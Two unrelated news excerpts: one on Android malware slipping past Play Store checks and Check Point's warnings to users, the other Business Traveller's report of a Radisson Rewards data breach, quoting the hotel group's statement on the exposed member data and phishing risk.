What's worrying is that Google has stated that a fix will be available in time for the release of Android O, which isn't expected until late summer. In the meantime, Check Point has urged users to beware of dodgy-looking apps and to check the comments left by other users.
Although the Play Store is able to police the apps being uploaded to its platform, malicious content is repeatedly bypassing security checks. Check Point recently disclosed the discovery of a new malware strain hidden inside game guides hosted on the Play Store, thought to have infected close to two million Android devices over the past seven months.

Radisson Hotel Group has confirmed that it has suffered a data breach on affecting “a small percentage of our Radisson Rewards members”.
Business Traveller was alerted to the incident by one of our readers, who had received an email from Radisson confirming that his details had been compromised.
Radisson says that it identified the breach on October 1, although it’s not clear exactly when the incident occured.
A statement on the group’s website states:
“This data security incident did not compromise any credit card or password information. Our ongoing investigation has determined that the information accessed was restricted to member name, address (including country of residence), email address, and in some cases, company name, phone number, Radisson Rewards member number and any frequent flyer numbers on file.
“Upon identifying this issue Radisson Rewards immediately revoked access to the unauthorized person(s). All impacted member accounts have been secured and flagged to monitor for any potential unauthorized behavior.
“While the ongoing risk to your Radisson Rewards account is low, please monitor your account for any suspicious activity. You should also be aware that third parties may claim to be Radisson Rewards and attempt to gather personal information by deception (known as “phishing”), including through the use of links to fake websites.
